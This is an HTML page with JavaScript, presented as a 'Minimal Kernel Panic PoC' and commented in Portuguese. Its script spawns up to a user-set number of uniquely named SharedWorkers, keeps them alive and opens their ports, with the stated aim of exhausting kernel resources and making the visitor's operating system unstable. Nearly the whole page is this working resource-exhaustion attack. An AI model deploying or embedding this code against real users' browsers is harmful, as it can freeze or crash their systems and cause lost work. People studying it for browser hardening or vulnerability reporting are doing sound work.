<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Minimal Kernel Panic PoC</title>
    <style>

    </style>
</head>
<body>

    <h1>Minimal SharedWorker Allocator</h1>

    <label>
        Alvo: <input type="number" id="count" value="1000">
    </label>
    <button onclick="run()">INICIAR ALOCAÇÃO</button>

    <div id="log">Pronto.<br></div>

    <script>
        // Array global para manter os workers vivos na memória RAM
        let keeps = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML = `> ${msg}<br>` + el.innerHTML;
        }

        function run() {
            const limit = parseInt(document.getElementById('count').value);
            log(`Tentando criar ${limit} SharedWorkers...`);

            if (!window.SharedWorker) return log("SharedWorker não suportado.");

            let created = 0;
            
            // Intervalo para não travar a UI do navegador enquanto o Kernel sofre
            const interval = setInterval(() => {
                // Cria em pequenos lotes
                for (let i = 0; i < 5; i++) {
                    try {
                        // O segredo: Nomes únicos geram novos processos/handles no Kernel
                        const id = "crash_test_" + Date.now() + "_" + created;
                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", id);
                        
                        // Força a alocação real do IPC
                        sw.port.start();
                        
                        keeps.push(sw);
                        created++;

                        if (created >= limit) {
                            clearInterval(interval);
                            log(`Limite de ${limit} atingido. Aguardando reação do sistema...`);
                            return;
                        }

                    } catch (e) {
                        clearInterval(interval);
                        log(`ERRO FATAL no worker ${created}: ${e.message}`);
                        log("O Kernel deve estar instável agora.");
                        return;
                    }
                }
                
                // Atualiza log a cada 50 criações para não poluir
                if (created % 50 === 0) log(`Criados: ${created}...`);

            }, 5);
        }
    </script>
</body>
</html>
